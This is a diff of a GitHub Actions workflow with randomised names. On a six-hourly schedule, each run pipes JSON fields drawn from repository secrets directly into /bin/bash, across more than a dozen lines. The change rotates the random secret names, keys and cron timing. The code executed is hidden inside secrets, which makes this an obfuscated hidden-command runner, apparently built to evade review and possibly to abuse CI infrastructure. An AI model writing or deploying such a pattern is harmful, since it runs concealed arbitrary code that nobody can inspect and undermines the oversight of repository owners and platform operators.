@@ -1,32 +1,30 @@
 name: tengluosai4318
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 5/6 * * *'
+    - cron: '9 5/6 * * *'
 
-jobs:  # 13577
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tengluosai4318
         env:
-          zgmz3: ${{ secrets.zgmz3 }}
+          qe352: ${{ secrets.qe352 }}
         run: |
-          echo $zgmz3 | jq -r .qx3220 | /bin/bash
-          echo $uett6 | jq -r .krdi2931 | /bin/bash
-          echo $dmaao1 | jq -r .fuof51 | /bin/bash
-          echo $to54176 | jq -r .asfhv21 | /bin/bash
-          echo $z51 | jq -r .lb2 | /bin/bash
-          echo $wlj66550 | jq -r .t243 | /bin/bash
-          echo $ja1 | jq -r .pm70102 | /bin/bash
-          echo $nxcqb29493 | jq -r .uz081 | /bin/bash
-          echo $kx71532 | jq -r .fgfm36 | /bin/bash
-          echo $tfjof35 | jq -r .yj89363 | /bin/bash
-          echo $xmwgs8 | jq -r .tx4299 | /bin/bash
-          echo $lrbme387 | jq -r .rwd51162 | /bin/bash
-          echo $cap84359 | jq -r .ht4362 | /bin/bash
-          echo $yidkv0 | jq -r .cx95467 | /bin/bash
-          echo $s15123 | jq -r .pnhm6103 | /bin/bash
+          echo $qe352 | jq -r .npx1976 | /bin/bash
+          echo $gaog990 | jq -r .d49980 | /bin/bash
+          echo $otjg4552 | jq -r .tbfb048 | /bin/bash
+          echo $hyz97141 | jq -r .qrbqo09 | /bin/bash
+          echo $fczyi9 | jq -r .vhhf064 | /bin/bash
+          echo $gcya1 | jq -r .wk89 | /bin/bash
+          echo $q80 | jq -r .fi23184 | /bin/bash
+          echo $s57 | jq -r .afbdp9 | /bin/bash
+          echo $lct10280 | jq -r .krxxj4 | /bin/bash
+          echo $gyf0 | jq -r .jp15 | /bin/bash
+          echo $adbz01186 | jq -r .li1811 | /bin/bash
+          echo $uhob5 | jq -r .js30 | /bin/bash
+          echo $h582 | jq -r .s67 | /bin/bash
 
